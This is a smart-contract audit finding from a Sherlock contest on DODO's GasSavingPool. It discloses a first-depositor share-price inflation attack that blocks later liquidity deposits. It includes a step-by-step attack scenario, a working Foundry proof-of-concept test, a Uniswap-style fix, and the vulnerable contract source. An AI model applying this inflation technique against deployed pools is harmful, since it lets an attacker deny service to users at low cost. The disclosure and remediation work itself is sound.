{
  "Title": "M-3: Share Price Inflation by First LP-er, Enabling DOS Attacks on Subsequent buyShares with Up to 1001x the Attacking Cost",
  "Content": "# Issue M-3: Share Price Inflation by First LP-er, Enabling DOS Attacks on Subsequent buyShares with Up to 1001x the Attacking Cost \n\nSource: https://github.com/sherlock-audit/2023-12-dodo-gsp-judging/issues/55 \n\n## Found by \n0xpep7, Bandit, Hama, cergyk, hash, osmanozdemir1, rvierdiiev, thank\\_you\n## Summary\nThe smart contract contains a critical vulnerability that allows a malicious actor to manipulate the share price during the initialization of the liquidity pool, potentially leading to a DOS attack on subsequent buyShares operations.\n\n## Vulnerability Detail\nThe root cause of the vulnerability lies in the initialization process of the liquidity pool, specifically in the calculation of shares during the first deposit.\n```solidity\n// Findings are labeled with '<= FOUND'\n// File: dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPFunding.sol\n31:    function buyShares(address to)\n        ...\n57:            // case 1. initial supply\n58:            // The shares will be minted to user\n59:            shares = quoteBalance < DecimalMath.mulFloor(baseBalance, _I_) // <= FOUND\n60:                ? DecimalMath.divFloor(quoteBalance, _I_)\n61:                : baseBalance; // @audit-info mint shares based on min balance(base, quote)\n62:            // The target will be updated\n63:            _BASE_TARGET_ = uint112(shares);\n            ...\n82:    }\n```\n\nIf the pool is empty, the smart contract directly sets the share value based on the minimium value of the base token  denominated value of the provided assets. This assumption can be manipulated by a malicious actor during the first deposit, leading to a situation where the LP pool token becomes extremely expensive.\n\n### Attack Scenario\nThe attacker exploits the vulnerability during the initialization of the liquidity pool:\n\n1. The attacker mints 1001 shares during the first deposit.\n\n2. Immediately, the attacker sells back 1000 shares, ensuring to keep 1 wei via the `sellShares` function.\n\n3. The attacker then donates a large amount (1000e18) of base and quote tokens and invokes the `sync()` routine to pump the base and quote reserves to 1001 + 1000e18.\n\n4. The protocol users proceed to execute the `buyShares` function with a balance less than `attacker's spending * 1001`. The transaction reverts due to the `mintRatio` being kept below 1001 wad and the computed `shares` less than 1001 (line 71), while it needs a value >= 1001 to mint shares successfully.\n```solidity\n// File: dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPFunding.sol\n31:    function buyShares(address to)\n        ...\n66:            // case 2. normal case\n67:            uint256 baseInputRatio = DecimalMath.divFloor(baseInput, baseReserve);\n68:            uint256 quoteInputRatio = DecimalMath.divFloor(quoteInput, quoteReserve);\n69:            uint256 mintRatio = quoteInputRatio < baseInputRatio ? quoteInputRatio : baseInputRatio; // <= FOUND: mintRatio below 1001wad if input amount smaller than reserves * 1001\n70:            // The shares will be minted to user\n71:            shares = DecimalMath.mulFloor(totalSupply, mintRatio); // <= FOUND: the manipulated totalSupply of 1wei requires a mintRatio of greater than 1000 for a successful _mint()\n            ...\n82:    }\n// File: dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPVault.sol\n294:    function _mint(address user, uint256 value) internal {\n295:        require(value > 1000, \"MINT_AMOUNT_NOT_ENOUGH\"); // <= FOUND: next buyShares with volume less than 1001 x attacker balance will revert here\n...\n300:    }\n```\n\n5. The `_mint()` function fails with a \"MINT_AMOUNT_NOT_ENOUGH\" error, causing a denial-of-service condition for subsequent buyShares operations.\n\n### POC\nApply the POC to `dodo-gassaving-pool/test/GPSTrader.t.sol` and run with `cd dodo-gassaving-pool && forge test --fork-url \"https://rpc.flashbots.net\" -vvv --mt test_mint1weiShares_DOSx1000DonationVolume` to check the result.\n\n```solidity\n// File: dodo-gassaving-pool/test/GPSTrader.t.sol\n    function test_mint1weiShares_DOSx1000DonationVolume() public {\n        GSP gspTest = new GSP();\n        gspTest.init(\n            MAINTAINER,\n            address(mockBaseToken),\n            address(mockQuoteToken),\n            0,\n            0,\n            1000000,\n            500000000000000,\n            false\n        );\n\n        // Buy 1001 shares\n        vm.startPrank(USER);\n        mockBaseToken.transfer(address(gspTest), 1001);\n        mockQuoteToken.transfer(address(gspTest), 1001 * gspTest._I_() / 1e18);\n        gspTest.buyShares(USER);\n        assertEq(gspTest.balanceOf(USER), 1001);\n\n        // User sells shares and keep ONLY 1wei\n        gspTest.sellShares(1000, USER, 0, 0, \"\", block.timestamp);\n        assertEq(gspTest.balanceOf(USER), 1);\n\n        // User donate a huge amount of base & quote tokens to inflate the share price\n        uint256 donationAmount = 1000e18;\n        mockBaseToken.transfer(address(gspTest), donationAmount);\n        mockQuoteToken.transfer(address(gspTest), donationAmount * gspTest._I_() / 1e18);\n        gspTest.sync();\n        vm.stopPrank();\n\n        // DOS subsequent operations with roughly 1001 x donation volume\n        uint256 dosAmount = donationAmount * 1001;\n        mockBaseToken.mint(OTHER, type(uint256).max);\n        mockQuoteToken.mint(OTHER, type(uint256).max);\n\n        vm.startPrank(OTHER);\n        mockBaseToken.transfer(address(gspTest), dosAmount);\n        mockQuoteToken.transfer(address(gspTest), dosAmount * gspTest._I_() / 1e18);\n\n        vm.expectRevert(\"MINT_AMOUNT_NOT_ENOUGH\");\n        gspTest.buyShares(OTHER);\n        vm.stopPrank();\n    }\n```\n\nA PASS result would confirm that any deposits with volume less than 1001 times to attacker cost would fail. That means by spending $1000, the attacker can DOS any transaction with volume below $1001,000.\n\n\n## Impact\nThe impact of this vulnerability is severe, as it allows an attacker to conduct DOS attacks on buyShares with a low attacking cost (retrievable for further attacks via `sellShares`). This significantly impairs the core functionality of the protocol, potentially preventing further LP operations and hindering the protocol's ability to attract Total Value Locked (TVL) for other trading operations such as sellBase, sellQuote and flashloan.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPFunding.sol#L56-L65\n\n## Tool used\nFoundry test\n\n## Recommendation\nA mechanism should be implemented to handle the case of zero totalSupply during initialization. A potential solution is inspired by [Uniswap V2 Core Code](https://github.com/Uniswap/v2-core/blob/ee547b17853e71ed4e0101ccfd52e70d5acded58/contracts/UniswapV2Pair.sol#L119-L124), which sends the first 1001 LP tokens to the zero address. This way, it's extremely costly to inflate the share price as much as 1001 times on the first deposit.\n\n```patch\n// File: dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPFunding.sol\n31:    function buyShares(address to)\n        ...\n56:        if (totalSupply == 0) {\n57:            // case 1. initial supply\n58:            // The shares will be minted to user\n59:            shares = quoteBalance < DecimalMath.mulFloor(baseBalance, _I_)\n60:                ? DecimalMath.divFloor(quoteBalance, _I_)\n61:                : baseBalance; \n+             _mint(address(0), 1001); // permanently lock the first MINIMUM_LIQUIDITY of 1001 tokens, makes it imposible to manipulate the totalSupply to 1 wei\n...\n``` ...\n```\n\n\n\n## Discussion\n\n**Skyewwww**\n\nWe have fixed this bug at this PR: https://github.com/DODOEX/dodo-gassaving-pool/pull/14\n\n**Czar102**\n\nBecause of the fact that this is \"just\" DoS (no loss of funds) and there are serious constraints on whether the attack is possible and there are high capital requirements for performing it, will make it a valid Medium.\n\n\n",
  "Impact": "MEDIUM",
  "Source": "https://app.sherlock.xyz/audits/contests/135",
  "Code": [
    {
      "filename": "dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPFunding.sol",
      "content": "/*\n\n    Copyright 2020 DODO ZOO.\n    SPDX-License-Identifier: Apache-2.0\n\n*/\n\n\npragma solidity 0.8.16;\n\nimport {GSPVault} from \"./GSPVault.sol\";\nimport {DecimalMath} from \"../../lib/DecimalMath.sol\";\nimport {IDODOCallee} from \"../../intf/IDODOCallee.sol\";\n\n/// @notice this part focus on Lp tokens, mint and burn\ncontract GSPFunding is GSPVault {\n    // ============ Events ============\n\n    event BuyShares(address to, uint256 increaseShares, uint256 totalShares);\n\n    event SellShares(address payer, address to, uint256 decreaseShares, uint256 totalShares);\n\n    // ============ Buy & Sell Shares ============\n    \n    /// @notice User mint Lp token and deposit tokens, the result is rounded down\n    /// @dev User first transfer baseToken and quoteToken to GSP, then call buyShares\n    /// @param to The address will receive shares\n    /// @return shares The amount of shares user will receive\n    /// @return baseInput The amount of baseToken user transfer to GSP\n    /// @return quoteInput The amount of quoteToken user transfer to GSP\n    function buyShares(address to)\n        external\n        nonReentrant\n        returns (\n            uint256 shares,\n            uint256 baseInput,\n            uint256 quoteInput\n        )\n    {\n        // The balance of baseToken and quoteToken should be the balance minus the fee\n        uint256 baseBalance = _BASE_TOKEN_.balanceOf(address(this)) - _MT_FEE_BASE_;\n        uint256 quoteBalance = _QUOTE_TOKEN_.balanceOf(address(this)) - _MT_FEE_QUOTE_;\n        // The reserve of baseToken and quoteToken\n        uint256 baseReserve = _BASE_RESERVE_;\n        uint256 quoteReserve = _QUOTE_RESERVE_;\n\n        // The amount of baseToken and quoteToken user transfer to GSP\n        baseInput = baseBalance - baseReserve;\n        quoteInput = quoteBalance - quoteReserve;\n\n        // BaseToken should be transferred to GSP before calling buyShares\n        require(baseInput > 0, \"NO_BASE_INPUT\");\n\n        // Round down when withdrawing. Therefore, never be a situation occuring balance is 0 but totalsupply is not 0\n        // But May Happenï¼Œreserve >0 But totalSupply = 0\n        if (totalSupply == 0) {\n            // case 1. initial supply\n            // The shares will be minted to user\n            shares = quoteBalance < DecimalMath.mulFloor(baseBalance, _I_)\n                ? DecimalMath.divFloor(quoteBalance, _I_)\n                : baseBalance;\n            // The target will be updated\n            _BASE_TARGET_ = uint112(shares);\n            _QUOTE_TARGET_ = uint112(DecimalMath.mulFloor(shares, _I_));\n        } else if (baseReserve > 0 && quoteReserve > 0) {\n            // case 2. normal case\n            uint256 baseInputRatio = DecimalMath.divFloor(baseInput, baseReserve);\n            uint256 quoteInputRatio = DecimalMath.divFloor(quoteInput, quoteReserve);\n            uint256 mintRatio = quoteInputRatio < baseInputRatio ? quoteInputRatio : baseInputRatio;\n            // The shares will be minted to user\n            shares = DecimalMath.mulFloor(totalSupply, mintRatio);\n\n            // The target will be updated\n            _BASE_TARGET_ = uint112(uint256(_BASE_TARGET_) + (DecimalMath.mulFloor(uint256(_BASE_TARGET_), mintRatio)));\n            _QUOTE_TARGET_ = uint112(uint256(_QUOTE_TARGET_) + (DecimalMath.mulFloor(uint256(_QUOTE_TARGET_), mintRatio)));\n        }\n        // The shares will be minted to user\n        // The reserve will be updated\n        _mint(to, shares);\n        _setReserve(baseBalance, quoteBalance);\n        emit BuyShares(to, shares, _SHARES_[to]);\n    }\n\n    /// @notice User burn their lp and withdraw their tokens, the result is rounded down\n    /// @dev User call sellShares, the calculated baseToken and quoteToken amount should geater than minBaseToken and minQuoteToken\n    /// @param shareAmount The amount of shares user want to sell\n    /// @param to The address will receive baseToken and quoteToken\n    /// @param baseMinAmount The minimum amount of baseToken user want to receive\n    /// @param quoteMinAmount The minimum amount of quoteToken user want to receive\n    /// @param data The data will be passed to callee contract\n    /// @param deadline The deadline of this transaction\n    function sellShares(\n        uint256 shareAmount,\n        address to,\n        uint256 baseMinAmount,\n        uint256 quoteMinAmount,\n        bytes calldata data,\n        uint256 deadline\n    ) external nonReentrant returns (uint256 baseAmount, uint256 quoteAmount) {\n        // The deadline should be greater than current timestamp\n        require(deadline >= block.timestamp, \"TIME_EXPIRED\");\n        // The amount of shares user want to sell should be less than user's balance\n        require(shareAmount <= _SHARES_[msg.sender], \"GLP_NOT_ENOUGH\");\n\n        // The balance of baseToken and quoteToken should be the balance minus the fee\n        uint256 baseBalance = _BASE_TOKEN_.balanceOf(address(this)) - _MT_FEE_BASE_;\n        uint256 quoteBalance = _QUOTE_TOKEN_.balanceOf(address(this)) - _MT_FEE_QUOTE_;\n        // The total shares of GSP\n        uint256 totalShares = totalSupply;\n\n        // The amount of baseToken and quoteToken user will receive is calculated by the ratio of user's shares to total shares\n        baseAmount = baseBalance * shareAmount / totalShares;\n        quoteAmount = quoteBalance * shareAmount / totalShares;\n        \n        // The target will be updated\n        _BASE_TARGET_ = uint112(uint256(_BASE_TARGET_) - DecimalMath._divCeil((uint256(_BASE_TARGET_) * (shareAmount)), totalShares));\n        _QUOTE_TARGET_ = uint112(uint256(_QUOTE_TARGET_) - DecimalMath._divCeil((uint256(_QUOTE_TARGET_) * (shareAmount)), totalShares));\n        \n        // The calculated baseToken and quoteToken amount should geater than minBaseToken and minQuoteToken\n        require(\n            baseAmount >= baseMinAmount && quoteAmount >= quoteMinAmount,\n            \"WITHDRAW_NOT_ENOUGH\"\n        );\n\n        // The shares will be burned from user\n        // The baseToken and quoteToken will be transferred to user\n        // The reserve will be synced\n        _burn(msg.sender, shareAmount);\n        _transferBaseOut(to, baseAmount);\n        _transferQuoteOut(to, quoteAmount);\n        _sync();\n\n        // If the data is not empty, the callee contract will be called\n        if (data.length > 0) {\n            //Same as DVM \n            IDODOCallee(to).DVMSellShareCall(\n                msg.sender,\n                shareAmount,\n                baseAmount,\n                quoteAmount,\n                data\n            );\n        }\n\n        emit SellShares(msg.sender, to, shareAmount, _SHARES_[msg.sender]);\n    }\n}"
    },
    {
      "filename": "contracts/UniswapV2Pair.sol",
      "content": "pragma solidity =0.5.16;\n\nimport './interfaces/IUniswapV2Pair.sol';\nimport './UniswapV2ERC20.sol';\nimport './libraries/Math.sol';\nimport './libraries/UQ112x112.sol';\nimport './interfaces/IERC20.sol';\nimport './interfaces/IUniswapV2Factory.sol';\nimport './interfaces/IUniswapV2Callee.sol';\n\ncontract UniswapV2Pair is IUniswapV2Pair, UniswapV2ERC20 {\n    using SafeMath  for uint;\n    using UQ112x112 for uint224;\n\n    uint public constant MINIMUM_LIQUIDITY = 10**3;\n    bytes4 private constant SELECTOR = bytes4(keccak256(bytes('transfer(address,uint256)')));\n\n    address public factory;\n    address public token0;\n    address public token1;\n\n    uint112 private reserve0;           // uses single storage slot, accessible via getReserves\n    uint112 private reserve1;           // uses single storage slot, accessible via getReserves\n    uint32  private blockTimestampLast; // uses single storage slot, accessible via getReserves\n\n    uint public price0CumulativeLast;\n    uint public price1CumulativeLast;\n    uint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event\n\n    uint private unlocked = 1;\n    modifier lock() {\n        require(unlocked == 1, 'UniswapV2: LOCKED');\n        unlocked = 0;\n        _;\n        unlocked = 1;\n    }\n\n    function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) {\n        _reserve0 = reserve0;\n        _reserve1 = reserve1;\n        _blockTimestampLast = blockTimestampLast;\n    }\n\n    function _safeTransfer(address token, address to, uint value) private {\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value));\n        require(success && (data.length == 0 || abi.decode(data, (bool))), 'UniswapV2: TRANSFER_FAILED');\n    }\n\n    event Mint(address indexed sender, uint amount0, uint amount1);\n    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\n    event Swap(\n        address indexed sender,\n        uint amount0In,\n        uint amount1In,\n        uint amount0Out,\n        uint amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    constructor() public {\n        factory = msg.sender;\n    }\n\n    // called once by the factory at time of deployment\n    function initialize(address _token0, address _token1) external {\n        require(msg.sender == factory, 'UniswapV2: FORBIDDEN'); // sufficient check\n        token0 = _token0;\n        token1 = _token1;\n    }\n\n    // update reserves and, on the first call per block, price accumulators\n    function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private {\n        require(balance0 <= uint112(-1) && balance1 <= uint112(-1), 'UniswapV2: OVERFLOW');\n        uint32 blockTimestamp = uint32(block.timestamp % 2**32);\n        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired\n        if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {\n            // * never overflows, and + overflow is desired\n            price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;\n            price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;\n        }\n        reserve0 = uint112(balance0);\n        reserve1 = uint112(balance1);\n        blockTimestampLast = blockTimestamp;\n        emit Sync(reserve0, reserve1);\n    }\n\n    // if fee is on, mint liquidity equivalent to 1/6th of the growth in sqrt(k)\n    function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) {\n        address feeTo = IUniswapV2Factory(factory).feeTo();\n        feeOn = feeTo != address(0);\n        uint _kLast = kLast; // gas savings\n        if (feeOn) {\n            if (_kLast != 0) {\n                uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));\n                uint rootKLast = Math.sqrt(_kLast);\n                if (rootK > rootKLast) {\n                    uint numerator = totalSupply.mul(rootK.sub(rootKLast));\n                    uint denominator = rootK.mul(5).add(rootKLast);\n                    uint liquidity = numerator / denominator;\n                    if (liquidity > 0) _mint(feeTo, liquidity);\n                }\n            }\n        } else if (_kLast != 0) {\n            kLast = 0;\n        }\n    }\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function mint(address to) external lock returns (uint liquidity) {\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        uint balance0 = IERC20(token0).balanceOf(address(this));\n        uint balance1 = IERC20(token1).balanceOf(address(this));\n        uint amount0 = balance0.sub(_reserve0);\n        uint amount1 = balance1.sub(_reserve1);\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        if (_totalSupply == 0) {\n            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);\n           _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\n        } else {\n            liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);\n        }\n        require(liquidity > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED');\n        _mint(to, liquidity);\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Mint(msg.sender, amount0, amount1);\n    }\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function burn(address to) external lock returns (uint amount0, uint amount1) {\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        address _token0 = token0;                                // gas savings\n        address _token1 = token1;                                // gas savings\n        uint balance0 = IERC20(_token0).balanceOf(address(this));\n        uint balance1 = IERC20(_token1).balanceOf(address(this));\n        uint liquidity = balanceOf[address(this)];\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution\n        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution\n        require(amount0 > 0 && amount1 > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED');\n        _burn(address(this), liquidity);\n        _safeTransfer(_token0, to, amount0);\n        _safeTransfer(_token1, to, amount1);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Burn(msg.sender, amount0, amount1, to);\n    }\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {\n        require(amount0Out > 0 || amount1Out > 0, 'UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT');\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'UniswapV2: INSUFFICIENT_LIQUIDITY');\n\n        uint balance0;\n        uint balance1;\n        { // scope for _token{0,1}, avoids stack too deep errors\n        address _token0 = token0;\n        address _token1 = token1;\n        require(to != _token0 && to != _token1, 'UniswapV2: INVALID_TO');\n        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n        if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n        require(amount0In > 0 || amount1In > 0, 'UniswapV2: INSUFFICIENT_INPUT_AMOUNT');\n        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));\n        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));\n        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UniswapV2: K');\n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n\n    // force balances to match reserves\n    function skim(address to) external lock {\n        address _token0 = token0; // gas savings\n        address _token1 = token1; // gas savings\n        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));\n        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));\n    }\n\n    // force reserves to match balances\n    function sync() external lock {\n        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);\n    }\n}"
    }
  ]
}